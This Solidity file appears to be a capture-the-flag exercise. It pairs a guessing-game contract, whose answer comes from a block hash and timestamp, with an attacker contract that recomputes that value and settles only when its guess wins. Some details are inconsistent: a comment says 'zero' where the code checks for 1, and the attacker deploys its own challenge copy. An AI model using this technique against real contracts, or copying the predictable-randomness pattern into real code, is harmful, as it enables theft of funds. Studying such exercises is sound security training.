// SPDX-License-Identifier: MIT
pragma solidity 0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(
            keccak256(block.blockhash(block.number - 1), now)
        ) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheFutureAttacker {
    PredictTheFutureChallenge predictContract;

    constructor() payable {
        require(msg.value == 2 ether);
        // figure out how to send 1 ether in this payment
        predictContract = new PredictTheFutureChallenge.value(1 ether)();
        predictContract.lockInGuess.value(1 ether)(1);
    }

    function settleGuess() external payable {
        // revert unless this just happens to hash down to zero
        require(
            uint8(keccak256(block.blockhash(block.number - 1), now)) % 10 == 1
        );
        predictContract.settle();
    }
}
